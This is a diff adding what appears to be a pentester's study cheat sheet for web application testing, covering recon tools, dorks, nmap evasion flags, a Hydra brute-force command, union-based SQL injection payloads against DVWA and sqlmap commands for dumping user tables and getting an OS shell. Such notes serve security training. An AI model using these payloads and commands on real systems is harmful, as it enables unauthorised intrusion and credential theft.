@@ -1,0 +1,257 @@
+##Application Proxies
+1. BurpSuite
+2. Proxystrike
+
+##Website Crawlers
+1. Dirb
+2. Dirbuster
+3. Uniscan
+4. Nikto
+
+
+#Vulnerability Scanners
+1. w3af
+2. Skipfish
+3. OpenVAS
+4. Nessus
+
+
+#Vulnerable Web apps to test
+1. OWASP Broken Web Applications (BWA) https://owasp.org/www-project-broken-web-applications/
+2. WebGoat
+3. Damn Vulnerable Web Application (DVWA)
+4. WackoPicko
+5. BodgeIT Store
+6. Peruggia
+7. Hackazon http://hackazon.webscantest.com/ https://github.com/rapid7/hackazon
+8. ZeroBank http://zero.webappsecurity.com/login.html
+9. Acunetix's SecurityTweets http://testhtml5.vulnweb.com/#/popular
+10. OWASP's vulnerabile web applications directory https://github.com/OWASP/OWASP-VWAD
+11. Vulnhub https://www.vulnhub.com/
+
+
+# Recon
+1a. Whois
+  ```whois zonetransfer.me```
+  Look for Domain names
+  Domain ID's
+  Registrar URL
+  Uploaded Dates
+  Created Dates
+  Registry Expiration Dates
+  Registrants Name
+  Organization
+  Address
+  Phone number
+  Email Address
+  Tech Email
+  Identify usernames
+  Identify Email address formats
+  Identify authorative DNS Servers
+  Identify other related host DNS Records
+ 
+ 2. Zone Tranfer
+    2a. Dig
+    ```dig axfr zonetranfer.me <NS SERVER URL>
+    
+    2b. dnsenum 
+    ```dnsenum zonetransfer.me```
+    
+    2c. fierce
+    fierce -dns google.com
+    -dns zonetransfer
+    
+    2d. DNSRecon
+    ```dnsrecon -a -w -g -d zonetransfer.me```
+    -a zone transfer
+    -w whois
+    -g google search
+    -d domain
+    
+    2e. NMAP 
+    ```nmap --script dns-brute --script-args dns-brute.domainpentesting-lab.com
+    
+ 3. Google Dorks
+ Useful google dorks
+    site:example.com filetype:pdf
+   "@example.com" -site:example.com
+    intitle:admin OR inurl:admin
+ 
+ 4. shodan
+ Useful shodan dorks
+    hostname:example.com
+    server: WEBCAM
+    port:80,443,8080
+    net:192.168.1.1/24
+    
+ 5. TheHarvester
+ 6. Maltego
+ 7. Recon-ng
+ 8. NSLookup
+ 
+8. Some NMAP stuff
+Hardcoded source port
+-sourceport
+
+Custom packet size
+--data-length
+
+Custom MTU
+--mtu
+
+MAC address spoofing
+--spoof-mac
+
+Locate virtual hosts
+http://ipneighbour.com
+
+Identify load balancers
+1. User burp request
+look for item with the following:
+set-Cookie: sERVERpROD_ppool  
+*Pool is the key word which gives away load balancers
+
+
+2. Analyze SSL differences between servers
+3. Redirect to a direct URL
+4. DNS Records
+5. kali 
+```lbd <URL/IP>```
+
+use WAFW00F
+
+#Identify Targets
+1. NMAP
+2. AMASS
+3. MASSCAN
+
+#Fingerprinting website
+1. Developer tools
+  network tab > Server 
+
+2. WhatWeb Scanner
+```whatweb -v 8.8.8.8```
+
+3. Nikto
+
+4. NMAP
+```nmap --script http-methods -p80,443,8080 8.8.8.8```
+
+5. Metasploit modules
+dir_list
+dir_scanner
+enum_wayback
+files_dir
+http_login
+robots_txt
+webdav_scanner
+
+
+HTTPS Misconfigs
+openssl s_client -connect 10.7.7.5
+
+CHECK for POODLE vulnerablity
+CCHECK for CRIME vulnerability
+-Disabled protocols
+-no_ssl3, -notls1, -notls1_1,-notls1_2
+
+sslscan 10.7.7.5
+
+sslyze --regular 10.7.7.5
+
+nmap --script ssl-enum-cipers -p 443 10.7.7.5
+
+Web application spiders
+BurpSuite PRO spider
+ZAP 
+
+#Burpsuite PRO decoder
+
+#Authentication
+NTLM
+Kerberos
+SSO
+Form-based
+Multi-Factor Authentication (MFA)
+One-Time Password (OTP)
+OAuth
+Session based
+
+#Authentication misconfigurations
+User name invalid
+Accont disable
+User not active
+User password not set
+
+#Hydra
+hydra -L users.txt -P passwords.txt http-get://targetip
+
+
+#Burp Intruder
+
+Paswword Recover
+Allow recover of old password
+Allow default passwords
+Allow reset
+
+#Predict session IDs
+Session fixation
+
+#Command inections
+URL
+Fileupload
+field input bypassing
+
+Identifying injections
+#Headers
+GET
+POST
+Cookies
+X-Forwarded-For
+User-Agent
+Referrer
+
+Shellshock
+
+SQL Injections
+1. Get basic information
+  a. try to break application with bad data
+  b. follow good data with the following:
+' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
+
+' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' and table_name= 'users' -- ' 
+
+' union SELECT concat(user_id,'-',first_name,' ', lastname),concat 'users'
+
+
+SQL Tools
+1. sqlmap 
+```sqlmap -r <REQUESTFILE> -p username --curent-db --current-user --threads 5```
+
+```sqlmap -u http//10.7.7.5/login.jsp --data "username=23&password=23" -D public --tables 
+
+```sqlmap -u http//10.7.7.5/login.jsp --data "username=23&password=23" -D public -T users -dump 
+
+Some other useful sql options
+
+-f fingerprint target
+-b returns DBMS banner
+--sql- access sql prompt
+--schema enumerate database schema
+--comments search for comments
+--reg-red reads Windows registry key
+--identify-waf identifies WAF protections
+--level scan level when sending requests
+--risk risk level when sending requests
+--os-shell attempts to obtain a shell
+
+2. sqlninja 
+```sqlninja -f <config file> -m m```
+
+3. BBQSQL
+
+
+
+ 
+        
+  
